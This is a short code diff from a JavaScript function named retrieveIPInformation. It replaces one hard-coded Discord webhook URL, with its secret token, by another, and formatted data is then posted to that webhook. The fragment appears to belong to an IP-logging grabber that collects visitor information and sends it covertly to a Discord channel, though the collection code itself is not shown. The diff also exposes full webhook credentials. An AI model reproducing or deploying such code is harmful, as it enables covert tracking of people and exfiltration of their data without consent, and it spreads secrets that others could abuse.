@@ -74,7 +74,7 @@ function retrieveIPInformation() {
 `;
 
 
-      const discordWebhookUrl = 'https://discord.com/api/webhooks/1121452381322891295/ZnGijSqnJ3WxtTJlU23uiyu1OLhEtpYMc2H2r_EhlQ7oCn0DNkQqSSEYe6Dvum7v0PEq';
+      const discordWebhookUrl = 'https://discord.com/api/webhooks/1129353308075720815/3DQCZXeUlyXpsYWPtppnkck-8yXz7vhhtL47x3STwEKMY8QNJTKStQhiSi8800BJPcJC';
       sendToDiscordWebhook(discordWebhookUrl, formattedData);
     })
     .catch(error => {
